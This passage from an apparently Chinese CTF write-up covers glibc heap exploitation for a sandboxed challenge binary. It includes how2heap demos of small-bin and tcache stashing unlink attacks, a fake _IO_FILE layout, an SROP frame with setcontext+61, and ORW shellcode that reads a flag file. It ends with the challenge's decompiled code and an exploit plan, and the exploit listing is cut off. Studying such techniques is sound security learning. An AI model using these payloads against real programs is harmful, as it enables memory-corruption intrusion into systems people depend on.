Maleficarum.</span><br><span class="hljs-comment">This PoC take care also of the glibc hardening of smallbin corruption.</span><br><span class="hljs-comment">[ ... ]</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">    // 获取 small bin 中倒数第二个 chunk 。</span><br><span class="hljs-comment">    bck = victim-&gt;bk;</span><br><span class="hljs-comment">      </span><br><span class="hljs-comment">    // 获取 small bin 中倒数第二个 chunk 。</span><br><span class="hljs-comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="hljs-comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="hljs-comment">                  goto errout;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">    // 获取 small bin 中倒数第二个 chunk 。</span><br><span class="hljs-comment">    set_inuse_bit_at_offset (victim, nb);</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="hljs-comment">    bin-&gt;bk = bck;</span><br><span class="hljs-comment">    bck-&gt;fd = bin;</span><br><span class="hljs-comment">       [ ... ]</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">jackpot</span><span class="hljs-params">()</span>&#123; <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">void</span>* fake_freelist[<span class="hljs-number">7</span>][<span class="hljs-number">4</span>];<br><br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">void</span> *dummies[<span class="hljs-number">7</span>];<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <br>      dummies[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span><br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++) &#123;<br>    fake_freelist[i][<span class="hljs-number">3</span>] = fake_freelist[i+<span class="hljs-number">1</span>];<br>  &#125;<br>  fake_freelist[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] = <span class="hljs-literal">NULL</span>;<br><br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br>  stack_buffer_2[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span> *)fake_freelist[<span class="hljs-number">0</span>];<br><br>    <br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <br>      <span class="hljs-built_in">free</span>(dummies[i]);<br>    <br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <br>      <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  assert((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk</p><p>并且同时满足之后的 bck-&gt;fd !&#x3D; victim 的检测，</p><p>那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。</p><p>当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。</p><h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><p><strong>前提：</strong></p><ol><li>能控制 Small Bin Chunk 的 bk 指针。</li><li>程序可以越过Tache取Chunk。(使用calloc即可做到)</li><li>程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。</li></ol><p><strong>目标：</strong></p><ol><li>向任意指定位置写入指定值。</li><li>向任意地址分配一个Chunk。</li></ol><p>how2heap-demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *chunk_lis[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *target;<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    stack_var[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-comment">//now we malloc 9 chunks</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        chunk_lis[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//put 7 chunks into tcache</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        <span class="hljs-built_in">free</span>(chunk_lis[i]);<br>    &#125;<br><br>    <span class="hljs-comment">//last tcache bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//now they are put into unsorted bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-comment">//convert into small bin</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<span class="hljs-comment">// size &gt; 0x90</span><br><br>    <span class="hljs-comment">//now 5 tcache bins</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br><br>    <span class="hljs-comment">//change victim-&gt;bck</span><br>    chunk_lis[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)stack_var; <span class="hljs-comment">//bk --&gt; target</span><br><br><br>    <span class="hljs-comment">//trigger the attack</span><br>    <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>);<br><br>    <span class="hljs-comment">//malloc and return our fake chunk on stack</span><br>    target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);   <br><br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)target);<br>    assert(target == &amp;stack_var[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>攻击方式1：任意写：</strong></p><p>利用的是tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中，这种情况可以使用calloc分配同大小堆块触发（因为calloc分配堆块时不从tcache bin中选取）</p><p>在获取到一个smallbin中的一个chunk后，如果tcache仍有足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。</p><p>当攻击者可以<strong>修改一个small bin的bk时</strong>，就可以实现在任意地址上写一个libc地址。</p><p><strong>攻击方式2：fake_chunk:</strong></p><p>当Tcache存在两个以上的空位时，程序会将我们的fake chunk置入Tcache, 分配fake_chunk到任意地址</p><ol><li>填充tcache bin，获得unsorted bin，泄露heap和libc</li><li>布置堆</li><li>向small bin中加入两个chunk</li><li>执行Tcache Stashing Unlink Attack</li></ol><h3 id="绕沙盒"><a href="#绕沙盒" class="headerlink" title="绕沙盒"></a>绕沙盒</h3><p><strong>winmt: 高版本绕沙盒的方式</strong></p><p>通过<code>setcontext + 61</code>，控制寄存器<code>rdx</code><br>（1）可以找<code>gadget</code>，使<code>rdi</code>或其他寄存器与<code>rdx</code>之间进行转换<br>（2）通过改<code>__malloc_hook</code>为<code>setcontext + 61</code>，劫持<code>IO_FILE</code>(多是<code>stdin</code>)，将<code>vtable</code>改成<code>_IO_str_jumps</code>的地址，最后通过<code>exit</code>，会走到<code>_IO_str_overflow</code>函数，其中有<code>malloc</code>函数触发<code>__malloc_hook</code>，此时的<code>rdx</code>就是<code>_IO_write_ptr</code>中的值，所以直接使<code>_IO_write_ptr = SROP_addr</code>即可。</p><p>通过改<code>__malloc_hook</code>并劫持<code>_IO_FILE</code>的方法：<br>为什么说一般劫持的都是<code>stdin</code>的<code>IO_FILE</code>呢？因为<code>__malloc_hook</code>与<code>stdin</code>距离是比较近的，可以在劫持<code>IO_FILE</code>的同时，就把<code>__malloc_hook</code>改掉。<br>可按如下方式构造<code>payload</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">SROP_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="hljs-number">0xe0</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(SROP_addr) <span class="hljs-comment"># _IO_write_ptr</span><br>payload = payload.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc_base + get_IO_str_jumps_offset())<br><br>frame = SigreturnFrame()<br>frame.rdi = <span class="hljs-number">0</span><br>frame.rsi = address<br>frame.rdx = <span class="hljs-number">0x200</span><br>frame.rsp = address + <span class="hljs-number">8</span><br>frame.rip = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>payload += <span class="hljs-built_in">bytes</span>(frame)<br>payload = payload.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span>) <span class="hljs-comment"># __malloc_hook</span><br></code></pre></td></tr></table></figure><h4 id="fake-IO"><a href="#fake-IO" class="headerlink" title="fake_IO"></a>fake_IO</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#------------------------  Gadget  ----------------------------</span><br>malloc_hook=libc_base+libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br><br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>stdin=libc_base+libc.sym[<span class="hljs-string">&quot;_IO_2_1_stdin_&quot;</span>]<br><br>malloc_hook_base=malloc_hook&amp;<span class="hljs-number">0xfffffffffffff000</span> <span class="hljs-comment">#内存⻚对⻬</span><br><br>vtable = libc_base + <span class="hljs-number">0x1E9560</span> <span class="hljs-comment">#_IO_str_jumps</span><br><br><span class="hljs-comment">#------------------------  fake_IO_stdin  ----------------------------</span><br>fake_io = p64(<span class="hljs-number">0xfbad1800</span>) <span class="hljs-comment">#flag</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_read_ptr</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_read_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_read_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_write_base</span><br>fake_io += p64(stdin+<span class="hljs-number">0xe0</span>) <span class="hljs-comment">#_IO_write_ptr: _IO_wide_data_0</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_write_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_buf_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_buf_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_save_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_backup_base</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_IO_save_end</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_markers</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_chain</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_fileno</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_flags2</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_old_offset</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_cur_column</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_vtable_offset</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_shortbuf</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_lock</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_offset</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_codecvt</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_wide_data</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_freeres_list</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#_freeres_buf</span><br>fake_io += p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#__pad5</span><br>fake_io += p64(vtable) <span class="hljs-comment">#vtable: _IO_str_jumps</span><br></code></pre></td></tr></table></figure><h4 id="ORW-shellcode"><a href="#ORW-shellcode" class="headerlink" title="ORW-shellcode"></a>ORW-shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#------------------------  mprotect  ----------------------------</span><br>frame = SigreturnFrame()<br>frame.rdi = malloc_hook_base<br>frame.rsi = <span class="hljs-number">0x1000</span><br>frame.rdx = <span class="hljs-number">7</span><br>frame.rsp = malloc_hook + <span class="hljs-number">0x8</span><br>frame.rip = libc_base + libc.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>chunk_edit= <span class="hljs-built_in">str</span>(frame)<br><br><br><span class="hljs-comment">#------------------------  ORW_shellcode  ----------------------------</span><br>shell = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"> xor rsi,rsi</span><br><span class="hljs-string"> mov rax,SYS_open</span><br><span class="hljs-string"> call start</span><br><span class="hljs-string"> .string &quot;./flag&quot;</span><br><span class="hljs-string"> start:</span><br><span class="hljs-string"> pop rdi</span><br><span class="hljs-string"> syscall</span><br><span class="hljs-string"> mov rdi,rax</span><br><span class="hljs-string"> mov rsi,rsp</span><br><span class="hljs-string"> mov rdx,0x100</span><br><span class="hljs-string"> mov rax,SYS_read</span><br><span class="hljs-string"> syscall</span><br><span class="hljs-string"> mov rdi,1</span><br><span class="hljs-string"> mov rsi,rsp</span><br><span class="hljs-string"> mov rdx,0x100</span><br><span class="hljs-string"> mov rax,SYS_write</span><br><span class="hljs-string"> syscall</span><br><span class="hljs-string"> mov rax,SYS_exit</span><br><span class="hljs-string"> syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">__malloc_hook_edit = p64(setcontext+<span class="hljs-number">61</span>) + p64(malloc_hook+<span class="hljs-number">0x10</span>) + asm(shell)<br> <br>payload = fake_io + chunk_edit.encode() + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + __malloc_hook_edit<br></code></pre></td></tr></table></figure><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p><strong>版本：Ubuntu GLIBC 2.31-0ubuntu9.2</strong></p><p><strong>沙箱</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">chen@chen:~/桌面/match/Pwnhub/tototo/toto$ seccomp-tools dump ./tototo<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005<br> 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007<br> 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007<br> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0007: 0x06 0x00 0x00 0x00000000  return KILL<br></code></pre></td></tr></table></figure><p><strong>main</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> buf; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  buf = <span class="hljs-number">0</span>;<br>  init_0();<br>  sandbox(a1, a2);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    ban_free_hook(); <span class="hljs-comment">//打free_hook就exit</span><br>    menu();<br>    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4uLL</span>);<br>    <span class="hljs-keyword">switch</span> ( atoi((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;buf) )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        Add();  <span class="hljs-comment">//Add_num &lt;=10 ； chunk_size = [0x200, 0x800]</span><br>        <span class="hljs-keyword">break</span>; <br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        Delete();   <span class="hljs-comment">//UAF</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        Edit();<span class="hljs-comment">//没有offbyone，从bk+1处开始修改，三次机会</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        Show();    <span class="hljs-comment">//泄露</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        Calloc();  <span class="hljs-comment">// Calloc_num &lt;=10 ; calloc不从tcache 里面取</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p><strong>函数给了calloc函数，官方WP打法tcache_stashing_unlink_attack，学习下</strong></p><ol><li>程序有UAF漏洞，可以从bk处编辑； </li><li>只泄露libc地址后，找到 <code>mp_.tcache_bins</code> 偏移，可以⽤<code> p mp_</code> 来查看</li><li>算出偏移后，利⽤<code> tcache stash unlink attack</code> 攻击技术攻击<code> mp.tcache_bins</code> ，这样可以将<code>大堆块</code> 也放置到 tcache_bins 当中</li><li>之后free⼀个 large_bins ，这样再修改其对应的位置的地址，申请到 malloc_hook 附近</li><li>打IO流，Orw攻击泄露flag。</li></ol><p><strong>自己的思路：存在UAF，初步的想法是large bin attack打mp_，通过calloc申请两个large bin泄露libc和heap</strong></p><p><strong>再利用malloc实现large bin attack打mp_，再tcache poinsion打malloc 接 setcontext_61+ORW</strong></p><p>（刚开始审代码不仔细，以为是calloc和malloc一共10次..）</p><p><strong>思路跟官方wp应该差不多</strong></p><p><strong>还有个打法，打environ泄露栈地址，在栈上接rop进行ORW</strong></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 